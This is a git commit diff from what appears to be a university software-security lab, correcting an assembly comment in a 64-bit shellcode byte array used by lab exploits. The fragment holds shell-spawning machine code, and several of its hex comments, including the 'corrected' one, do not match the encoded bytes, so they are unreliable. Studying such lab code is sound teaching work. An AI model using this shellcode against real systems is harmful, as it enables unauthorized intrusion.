4f2630f67276613fc9ff4ef909c6edf6da4a50d8
Itta Kato <itta.kato@mail.utoronto.ca>
2022-09-20 17:48:10 -0400

    fix comments for shellcode

--- lab1/sploits/shellcode-64.h
+++ lab1/sploits/shellcode-64.h
@@ -2,7 +2,7 @@ static char shellcode[] =
     "\x48\x31\xc0"                  /* xor rax, rax */
     "\x50"                          /* push rax */
     "\x48\x8d\x3d\x22\x01\x01\x01"  /* lea rdi,[rip + 0x101010122] */
-    "\x48\x81\xef\x01\x01\x01\x01"  /* sub rdi,0x10101010 */
+    "\x48\x81\xef\x01\x01\x01\x01"  /* sub rdi, 0x101010101 */
     "\x57"                          /* push rdi */
     "\x48\x89\xe6"                  /* mov rsi, rsp */
     "\x48\x31\xd2"                  /* xor rdx, rdx */
